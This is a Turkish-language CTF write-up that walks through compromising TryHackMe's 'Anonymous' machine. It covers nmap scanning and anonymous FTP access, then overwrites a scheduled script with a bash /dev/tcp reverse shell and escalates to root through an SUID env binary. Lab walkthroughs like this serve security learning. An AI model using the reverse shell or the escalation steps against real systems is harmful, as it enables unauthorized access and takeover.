---
title: "Anonymous Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere [TryHackMe](https://tryhackme.com/) platformunda bulunan "Anonymous" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum. 

```shell
> nmap -sS -sV 10.10.229.39
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:40 +03
Nmap scan report for 10.10.229.39
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

2 -  Nmap aracını kullanarak Anonymous FTP testi yapıyorum. FTP servisine anonymous:anonymous bilgileri ile giriş yapılabildiğini görüyorum.

```shell
> nmap --script ftp-anon -p 21 10.10.229.39                                                                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:42 +03
Nmap scan report for 10.10.229.39
Host is up (0.13s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

3 - FTP  servisi içerisindeki dosyaları indiriyorum.

```shell
> ftp 10.10.229.39
*
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||41705|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Jun 05 12:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *
```

4 - *clean.sh* dosyasının içeriğini incelediğimde bu scriptin düzenli olarak çalıştırıldığını ve çalışma sonuçlarının da ftp  sunucusuna yüklendiğini anlıyorum. Ben de bu dosyasının içerisine bir reverse shell yükleyip tekrar ftp sunucusuna yükleyerek bir shell elde etmeye çalışacağım.

```system
> cat > clean.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/XX.XX.XX.XX/4444 0>&1
```

5 - Düzenlediğim dosyayı tekrar ftp servisine yüklüyorum.

```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||24385|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1290 Jun 05 12:48 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> put clean.sh
```

6 - user.txt dosyasını okuyarak ilk bayrağımı elde ediyorum.

```system
> nc -lvnp 4444                                                                                                    
Listening on 0.0.0.0 4444
Connection received on 10.10.229.39 54050
bash: cannot set terminal process group (1281): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
***CENSORED***
```

7 - Sudo yetkilerine sahip ve SUID biti ayarlanmış dosyaları bulmaya çalışıyorum.

```system
namelessone@anonymous:~$ find / -perm -u=s -type f 2>/dev/null
*
/usr/bin/env
*
```

8 - GTFObins sitesinden "env" komutu için sudo kullanıcısına geçmeye yarayan komutu buluyorum. Sudo kullanıcısına geçtikten sonra ikinci bayrağı da elde ederek odayı tamamlıyorum.

```system
namelessone@anonymous:~$ env /bin/sh -p
env /bin/sh -p
whoami
root
cat /root/root.txt
***CENSORED***
```